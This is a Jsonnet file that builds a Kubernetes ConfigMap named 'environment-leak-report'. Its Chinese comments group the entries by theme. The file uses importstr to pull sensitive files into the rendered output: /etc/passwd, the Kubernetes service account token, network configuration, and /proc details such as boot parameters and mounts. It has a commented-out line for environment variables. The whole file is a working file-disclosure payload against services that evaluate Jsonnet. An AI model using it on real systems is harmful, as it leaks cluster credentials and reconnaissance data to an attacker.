{
  apiVersion: "v1",
  kind: "ConfigMap",
  metadata: {
    name: "environment-leak-report",
  },
  data: {
    // --- 身份与权限 ---
    "passwd": importstr "/etc/passwd",
    "group": importstr "/etc/group",
    "k8s-token": importstr "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "k8s-namespace": importstr "/var/run/secrets/kubernetes.io/serviceaccount/namespace",

    // --- 系统发行版信息 ---
    "os-release": importstr "/etc/os-release",
    "issue": importstr "/etc/issue",

    // --- 网络与标识 ---
    "hostname": importstr "/etc/hostname",
    "hosts": importstr "/etc/hosts",
    "resolv.conf": importstr "/etc/resolv.conf",

    // --- 硬件与内核信息 (ProcFS) ---
    "cpuinfo": importstr "/proc/cpuinfo",
    "meminfo": importstr "/proc/meminfo",
    "version": importstr "/proc/version",
    "cmdline": importstr "/proc/cmdline", // 启动参数，可能包含敏感启动项

    // --- 挂载与文件系统 ---
    "mounts": importstr "/proc/mounts",
    
    // --- 环境变量 (注意：如果 importstr 读取的是 /proc/self/environ，可能会因为包含空字符导致解析问题) ---
    // "env": importstr "/proc/self/environ", 
  }
}
